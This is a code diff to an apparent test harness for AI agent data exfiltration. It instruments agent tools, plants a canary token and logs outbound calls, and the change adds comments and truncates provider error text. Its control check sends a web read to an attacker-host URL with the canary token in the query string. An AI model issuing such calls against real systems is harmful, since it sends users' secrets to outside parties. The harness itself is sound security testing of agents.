@@ -99,6 +99,8 @@ async function mechanicalControlPasses(): Promise<boolean> {
   const tools = buildInstrumentedTools(
     web, canary, (e) => egress.push(e), () => {}, () => {}, false,
   );
+  // The instrumented handlers never read the agent arg (harness.ts) — an empty
+  // stub satisfies the ToolHandler 2-arg signature without wiring a real Agent.
   const webHandler = (input: unknown) => tools[0]!.handler(input, {} as IAgent);
   await webHandler({ action: 'read', url: `https://${ATTACKER_HOST}/probe?token=${canary}` });
   if (egress.length !== 1) return false;
@@ -145,7 +147,13 @@ async function main(): Promise<void> {
             const k: Key = `${ch}|${c.arm}|${spec.label}`;
             bump(k, cell => { cell.runs += 1; if (live) cell.live += 1; });
           }
-          if (!live) { excluded.push(`${spec.label}/${c.id}/int=${interactive}/r${r}: ${out.error ?? 'no-delivery'}`); continue; }
+          if (!live) {
+            // Truncate the provider error before it reaches the report file — it
+            // is upstream text (the one place external content touches disk), and
+            // a bounded slice keeps a malformed/huge error from bloating the report.
+            const reason = out.error !== undefined ? out.error.slice(0, 120) : 'no-delivery';
+            excluded.push(`${spec.label}/${c.id}/int=${interactive}/r${r}: ${reason}`); continue;
+          }
 
           for (const e of out.egress) {
             const k: Key = `${e.call.channel}|${c.arm}|${spec.label}`;
